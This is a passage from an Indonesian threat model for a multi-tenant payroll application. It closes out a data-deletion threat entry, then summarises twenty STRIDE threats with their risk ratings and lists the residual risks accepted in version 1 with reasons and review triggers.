Mitigation    : Tidak ada DELETE baris payroll/employee (desain database §5). Penghapusan = anonimisasi kolom PII
                 (enc → NULL, nama → "Karyawan #<no>"), sementara angka payroll tetap untuk kewajiban
                 penyimpanan pajak/akuntansi. Offboarding tenant: export data, lalu penghapusan terjadwal.
                 V2: crypto-shredding (hapus DEK tenant di KMS).
Detection     : Audit employee.anonymized / tenant.offboarded.
Test          : Anonimisasi employee → PII tidak terbaca, total payroll historis tidak berubah.
Status        : Production enhancement (prosedur + endpoint ops). V1 hanya mendesain jalurnya. Retensi pajak
                 vs hak penghapusan perlu verifikasi hukum sebelum dipakai nyata.
```

---

## 5. Ringkasan

| ID | Judul | STRIDE | Inherent | Residual | Status |
|---|---|---|---|---|---|
| T-PR-01 | Akses data lintas tenant | I, T, E | Critical | Low | MVP |
| T-PR-02 | Tenant switching & membership basi | S, E | High | Low | MVP (jendela ≤ 15 mnt diterima) |
| T-PR-03 | Privilege escalation dalam tenant | E | High | Low | MVP |
| T-PR-04 | Token undangan | S, E | High | Low | MVP |
| T-PR-05 | Bypass SoD payroll run | E, R | High | Medium | MVP (risiko satu admin diterima) |
| T-PR-06 | Bypass approval / finalize | T, E | High | Low | MVP |
| T-PR-07 | Salary tampering | T, R | High | Medium | MVP (insider sah) |
| T-PR-08 | Perubahan retroaktif periode final | T | High | Low | MVP |
| T-PR-09 | Akses & kebocoran payslip | I, T | High | Low | MVP / P1 |
| T-PR-10 | Kebocoran PII | I | High | Low | P1 |
| T-PR-11 | Upload CSV berbahaya | D, T | Medium | Low | P1 (+ malware scan: production) |
| T-PR-12 | CSV/formula injection export | T | Medium | Low | P2 |
| T-PR-13 | Tenant confusion di job | T, I | High | Low | MVP |
| T-PR-14 | RLS salah konfigurasi | I, E | Critical | Low | MVP |
| T-PR-15 | SECURITY DEFINER login | I, E | Medium | Low | MVP |
| T-PR-16 | Akses platform operator | I, R, E | High | Medium | MVP (tanpa backdoor) / P2 break-glass |
| T-PR-17 | Noisy neighbor / DoS tenant | D | Medium | Medium | MVP / P2 fairness |
| T-PR-18 | Enumerasi informasi | I | Low | Low | MVP |
| T-PR-19 | Repudiation & integritas audit | R, I | Medium | Low | MVP |
| T-PR-20 | Penghapusan data / offboarding | I | Medium | Medium | Production enhancement |

---

## 6. Residual risk yang diterima di V1

| Risiko | Kenapa diterima | Kapan ditinjau ulang |
|---|---|---|
| Jendela ≤ 15 menit setelah membership dicabut untuk operasi non-sensitif (T-PR-02) | Menghindari query membership di setiap request; operasi sensitif tetap dicek | Pelanggan menuntut pencabutan instan → daftar revoke di Redis |
| Self-approval payroll di tenant satu admin (T-PR-05) | UMKM tidak punya orang kedua; risiko dibuat terlihat lewat audit + metrik | Opsi "SoD keras" per tenant di V2 |
| HR_ADMIN + PAYROLL_ADMIN pada satu orang (T-PR-05) | Realitas UMKM; diaudit dan diperingatkan | Sama seperti di atas |
| Insider dengan hak sah memanipulasi gaji (T-PR-07) | Kontrol proses (approver, diff) di luar kemampuan teknis untuk mencegah sepenuhnya | Laporan anomali lanjutan V2 |
| Presigned URL berlaku 5 menit setelah bocor (T-PR-09) | Trade-off UX download langsung dari storage | Download diproksikan lewat api jika diperlukan |
| Aplikasi yang diretas bisa mendekripsi PII (T-PR-10) | Keyring di memori proses adalah batas enkripsi level aplikasi | KMS envelope per tenant (V2) |
| Operator dengan akses infra bisa membaca data non-terenkripsi (T-PR-16) | Satu orang pemilik project; tidak ada tim support | pgaudit + pemisahan akses produksi saat tim tumbuh |
| Tanpa fairness job per tenant (T-PR-17) | Belum ada tenant besar | Load test menunjukkan run tenant kecil tertunda > SLO |
| Slug tenant terungkap saat signup (T-PR-18) | Nilai informasinya rendah | — |
| Prosedur penghapusan data belum diimplementasi (T-PR-20) | Portfolio tanpa data nyata; jalur sudah didesain | Sebelum data karyawan sungguhan dipakai |
